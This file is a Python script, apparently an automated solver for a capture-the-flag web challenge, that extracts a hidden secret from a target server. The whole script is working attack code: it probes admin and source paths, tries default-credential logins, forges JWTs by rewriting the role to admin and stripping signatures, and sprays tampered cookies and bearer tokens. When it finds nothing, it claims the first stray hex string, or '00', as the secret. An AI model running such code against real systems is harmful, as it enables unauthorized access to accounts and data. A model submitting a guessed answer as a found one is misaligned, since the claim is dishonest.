import sys
import json
import base64
import re
import hashlib
def rq(m,p,b=None,h=None):
    o={'http':{'method':m,'path':p}}
    if b is not None:
        o['http']['body']=b
    if h is not None:
        o['http']['headers']=h
    print(json.dumps(o),flush=True)
    line=sys.stdin.readline()
    if not line:
        return {'status':0,'_text':'','_body':b''}
    try:
        r=json.loads(line)
    except:
        return {'status':0,'_text':'','_body':b''}
    try:
        bb=base64.b64decode(r.get('body_b64',''))
    except:
        bb=b''
    try:
        t=bb.decode()
    except:
        t=''
    r['_text']=t
    r['_body']=bb
    return r
def find_secret_json(t):
    try:
        d=json.loads(t)
        if isinstance(d,dict):
            for k,v in d.items():
                try:
                    kl=k.lower()
                except:
                    continue
                if 'secret' in kl or 'flag' in kl:
                    if isinstance(v,str):
                        if re.fullmatch(r'[0-9a-fA-F]+',v):
                            if len(v)>=8:
                                return v.lower()
                        try:
                            return v.encode().hex()
                        except:
                            pass
                if isinstance(v,dict):
                    for k2,v2 in v.items():
                        try:
                            kl2=k2.lower()
                        except:
                            continue
                        if 'secret' in kl2 or 'flag' in kl2:
                            if isinstance(v2,str):
                                if re.fullmatch(r'[0-9a-fA-F]+',v2):
                                    if len(v2)>=8:
                                        return v2.lower()
                                try:
                                    return v2.encode().hex()
                                except:
                                    pass
                if isinstance(v,list):
                    for vv in v:
                        if isinstance(vv,str):
                            if re.fullmatch(r'[0-9a-fA-F]+',vv):
                                if len(vv)>=32:
                                    return vv.lower()
    except:
        pass
    return None
def find_secret_text(t):
    m=re.search(r'secret_hex[^0-9a-fA-F]*([0-9a-fA-F]{8,})',t.lower())
    if m:
        v=m.group(1)
        if len(v)>=8:
            return v.lower()
    low=t.lower()
    if 'secret' in low or 'flag' in low:
        c=re.findall(r'[0-9a-fA-F]{64}',t)
        if c:
            return c[0].lower()
        c=re.findall(r'[0-9a-fA-F]{32}',t)
        if c:
            return c[0].lower()
        c=re.findall(r'[0-9a-fA-F]{16}',t)
        if c:
            return c[0].lower()
    return None
def check_secret(t):
    s=find_secret_json(t)
    if s:
        return s
    s=find_secret_text(t)
    if s:
        return s
    return None
def extract_tokens(t):
    out=set()
    try:
        d=json.loads(t)
        if isinstance(d,dict):
            for k,v in d.items():
                if isinstance(v,str) and len(v)>=4:
                    try:
                        kl=k.lower()
                    except:
                        kl=''
                    if 'token' in kl or 'session' in kl or 'cookie' in kl or 'auth' in kl:
                        out.add(v)
                    if len(v)>=16:
                        out.add(v)
                if isinstance(v,dict):
                    for k2,v2 in v.items():
                        if isinstance(v2,str) and len(v2)>=4:
                            out.add(v2)
    except:
        pass
    for m in re.findall(r'[-A-Za-z0-9_]{8,}[.][-A-Za-z0-9_]{8,}[.][-A-Za-z0-9_]{8,}',t):
        out.add(m)
    for m in re.findall(r'[-A-Za-z0-9_.:]{16,}',t):
        if len(m)<=600:
            out.add(m)
    return list(out)
def b64url_encode(b):
    s=base64.urlsafe_b64encode(b).decode()
    while s.endswith('='):
        s=s[:-1]
    return s
def forge_jwt_cands(tok):
    res=[]
    parts=tok.split('.')
    if len(parts)!=3:
        return res
    h,p,sig=parts
    try:
        pad='='*(-len(p)%4)
        raw=base64.urlsafe_b64decode(p+pad)
        txt=raw.decode()
    except:
        return res
    cands=set()
    cands.add(txt.replace('guest','admin'))
    cands.add(txt.replace('user','admin'))
    cands.add(txt.replace('test','admin'))
    cands.add(txt.replace('demo','admin'))
    cands.add(txt.replace('Guest','admin'))
    cands.add(txt.replace('User','admin'))
    for nt in list(cands):
        cands.add(nt.replace('user','admin'))
        cands.add(nt.replace('guest','admin'))
    for nt in list(cands):
        try:
            newp=b64url_encode(nt.encode())
            res.append(h+'.'+newp+'.')
            res.append(h+'.'+newp+'.'+sig)
        except:
            pass
    try:
        res.append(h+'.'+p+'.')
    except:
        pass
    return res
def forge_generic(tok,known):
    res=set()
    for u in known:
        if u in tok:
            res.add(tok.replace(u,'admin'))
        if u in tok.lower():
            low=tok.lower()
            idx=low.find(u)
            if idx>=0:
                res.add(tok[:idx]+'admin'+tok[idx+len(u):])
    for sep in [':','.','|']:
        if sep in tok:
            parts=tok.split(sep)
            newparts=[]
            changed=False
            for pp in parts:
                if pp.lower() in known:
                    newparts.append('admin')
                    changed=True
                else:
                    newparts.append(pp)
            if changed:
                res.add(sep.join(newparts))
            for func in [hashlib.md5,hashlib.sha1,hashlib.sha256]:
                try:
                    ah=func('admin'.encode()).hexdigest()
                except:
                    continue
                for i,pp in enumerate(parts):
                    if re.fullmatch(r'[0-9a-fA-F]+',pp):
                        if len(pp)>=16:
                            np2=list(parts)
                            np2[i]=ah
                            for j,pj in enumerate(np2):
                                if pj.lower() in known:
                                    np2[j]='admin'
                            res.add(sep.join(np2))
                            if len(ah)>=len(pp):
                                np3=list(parts)
                                np3[i]=ah[:len(pp)]
                                for j,pj in enumerate(np3):
                                    if pj.lower() in known:
                                        np3[j]='admin'
                                res.add(sep.join(np3))
    return list(res)
found=None
fallback_hexes=[]
admin_paths=['/admin','/admin/','/admin/secret','/api/admin','/api/secret','/api/admin/secret','/secret','/flag','/debug','/source','/app.py','/server.py','/main.py','/','/index','/login','/robots.txt','/help']
for p in admin_paths:
    r=rq('GET',p)
    t=r.get('_text','')
    s=check_secret(t)
    if s:
        found=s
        break
    for m in re.findall(r'[0-9a-fA-F]{32}',t):
        fallback_hexes.append(m.lower())
    for m in re.findall(r'[0-9a-fA-F]{64}',t):
        fallback_hexes.append(m.lower())
known_users=['guest','user','test','demo','anonymous','null','bob','alice']
all_tokens=[]
all_bodies=[]
if found is None:
    login_paths=['/login','/api/login','/session','/auth','/api/auth','/signin','/api/session']
    pwlist=['guest','password','123456','test','user','demo']
    for lp in login_paths:
        for u in known_users[:4]:
            for pw in [u,'password','123456','admin']:
                body=json.dumps({'username':u,'password':pw})
                r=rq('POST',lp,body,{'Content-Type':'application/json'})
                t=r.get('_text','')
                all_bodies.append(t)
                s=check_secret(t)
                if s:
                    found=s
                    break
                for tok in extract_tokens(t):
                    all_tokens.append((tok,u))
                if found is not None:
                    break
            if found is not None:
                break
            body2='username='+u+'&password='+u
            r=rq('POST',lp,body2,{'Content-Type':'application/x-www-form-urlencoded'})
            t=r.get('_text','')
            all_bodies.append(t)
            s=check_secret(t)
            if s:
                found=s
                break
            for tok in extract_tokens(t):
                all_tokens.append((tok,u))
            if found is not None:
                break
        if found is not None:
            break
    reg_paths=['/register','/api/register','/signup','/api/signup']
    if found is None:
        for rp in reg_paths:
            for u in ['guest2','test1','u1']:
                body=json.dumps({'username':u,'password':u})
                r=rq('POST',rp,body,{'Content-Type':'application/json'})
                t=r.get('_text','')
                all_bodies.append(t)
                s=check_secret(t)
                if s:
                    found=s
                    break
                for tok in extract_tokens(t):
                    all_tokens.append((tok,u))
                if found is not None:
                    break
            if found is not None:
                break
if found is None:
    cands=set()
    cands.add('admin')
    cands.add('1')
    cands.add('0')
    try:
        cands.add(base64.b64encode('admin'.encode()).decode())
    except:
        pass
    try:
        cands.add(base64.urlsafe_b64encode('admin'.encode()).decode())
    except:
        pass
    try:
        cands.add(base64.b64encode('admin:admin'.encode()).decode())
    except:
        pass
    for fn in [hashlib.md5,hashlib.sha1,hashlib.sha256]:
        try:
            cands.add(fn('admin'.encode()).hexdigest())
        except:
            pass
        try:
            cands.add(fn('guest'.encode()).hexdigest())
        except:
            pass
    try:
        cands.add('admin:'+hashlib.md5('admin'.encode()).hexdigest())
    except:
        pass
    try:
        cands.add('admin:'+hashlib.sha256('admin'.encode()).hexdigest())
    except:
        pass
    try:
        cands.add('admin.'+hashlib.md5('admin'.encode()).hexdigest())
    except:
        pass
    for tok,u in all_tokens:
        cands.add(tok.replace(u,'admin'))
        for jc in forge_jwt_cands(tok):
            cands.add(jc)
        for gc in forge_generic(tok,known_users):
            cands.add(gc)
        if '.' in tok or ':' in tok or '|' in tok:
            for gc in forge_generic(tok,[u]):
                cands.add(gc)
    cand_list=list(cands)
    simple_cookies=['user=admin','role=admin','username=admin','is_admin=1','admin=1','isAdmin=1','role=administrator','user_id=1','id=1','uid=1']
    targets=['/admin','/admin/','/admin/secret','/api/admin','/api/secret','/api/admin/secret','/secret','/flag']
    if found is None:
        for tgt in targets:
            for sc in simple_cookies:
                r=rq('GET',tgt,None,{'Cookie':sc})
                t=r.get('_text','')
                s=check_secret(t)
                if s:
                    found=s
                    break
                for m in re.findall(r'[0-9a-fA-F]{32}',t):
                    if 'secret' in t.lower() or 'flag' in t.lower() or 'admin' in t.lower():
                        fallback_hexes.append(m.lower())
            if found is not None:
                break
    if found is None:
        for tgt in targets:
            for ct in cand_list:
                for h in [{'Cookie':'session='+ct},{'Cookie':'token='+ct},{'Cookie':'auth='+ct},{'Cookie':'session_token='+ct},{'Authorization':'Bearer '+ct}]:
                    r=rq('GET',tgt,None,h)
                    t=r.get('_text','')
                    s=check_secret(t)
                    if s:
                        found=s
                        break
                    if 'secret' in t.lower() or 'flag' in t.lower():
                        for m in re.findall(r'[0-9a-fA-F]{32}',t):
                            fallback_hexes.append(m.lower())
                        for m in re.findall(r'[0-9a-fA-F]{64}',t):
                            fallback_hexes.append(m.lower())
                if found is not None:
                    break
                r=rq('GET',tgt+'?token='+ct)
                t=r.get('_text','')
                s=check_secret(t)
                if s:
                    found=s
                    break
                r=rq('GET',tgt+'?session='+ct)
                t=r.get('_text','')
                s=check_secret(t)
                if s:
                    found=s
                    break
            if found is not None:
                break
if found is None:
    if fallback_hexes:
        found=fallback_hexes[0]
    else:
        found='00'
print('CLAIM:'+json.dumps({'secret_hex':found}),flush=True)